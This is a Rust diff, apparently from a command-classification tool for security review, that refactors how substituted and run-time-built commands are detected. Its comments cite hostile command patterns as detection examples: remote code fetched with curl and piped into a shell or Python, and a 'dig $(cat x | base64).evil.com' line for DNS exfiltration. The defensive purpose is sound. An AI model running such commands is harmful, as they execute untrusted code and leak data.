@@ -309,7 +309,7 @@ fn classify_as_written(
     super::executes::note(&argv, program, &cmd.reads, ctx, sink);
     super::installs::note(&argv, program, sink)?;
     let substituted = cmd.substitutions_of_last(argv.len());
-    push_substituted_programs(&substituted, &argv, program, sink)?;
+    pipelines::push_substituted_programs(&substituted, &argv, program, sink)?;
 
     let substitution = in_place::substitution(&argv, program);
     push_command(cmd, &argv, program, substitution, ctx, sink)?;
@@ -445,24 +445,6 @@ fn classify_as_written(
     options::classify(&argv, &substituted, program, ctx, sink, depth)
 }
 
-/// The canonical pipeline atoms of text the command runs from its own words'
-/// substitutions (`substituted`, aligned with `argv`): `$(curl URL)` as the
-/// program, here or in a shell's single-quoted string (`sh -c '$(curl
-/// URL)'`), runs the words curl prints as a command, so it gets `curl URL |
-/// sh`'s atoms; `python3 -c "$(curl URL)"` runs what curl prints as its code.
-fn push_substituted_programs(
-    substituted: &[&[String]],
-    argv: &[String],
-    program: &str,
-    sink: &mut Sink,
-) -> Result<(), ClassifyError> {
-    pipelines::push_substituted_code(substituted.first().copied(), "sh", sink)?;
-    if let Some(index) = inline_flags(program).and_then(|flags| flag_payload_index(argv, flags)) {
-        pipelines::push_substituted_code(substituted.get(index).copied(), program, sink)?;
-    }
-    Ok(())
-}
-
 /// Classify a wrapper's inner argv (`sudo rm …` → `rm …`) as its own command.
 ///
 /// `outer` holds, aligned with `inner` when the wrapper was handed them, the
@@ -572,10 +554,7 @@ fn classify_arguments(
                 AtomicAction::NetWord { host }
             })?;
             continue;
-        } else if names_hosts
-            && tok.contains(['$', '`'])
-            && let Some(host) = host::of_built_word(tok)
-        {
+        } else if names_hosts && let Some(host) = host::of_built_argument(program, tok) {
             // `dig $(cat x | base64).evil.com`: a name built at run time still
             // goes to the domain it ends in (DNS exfiltration)
             sink.push(AtomicAction::Net { host })?;
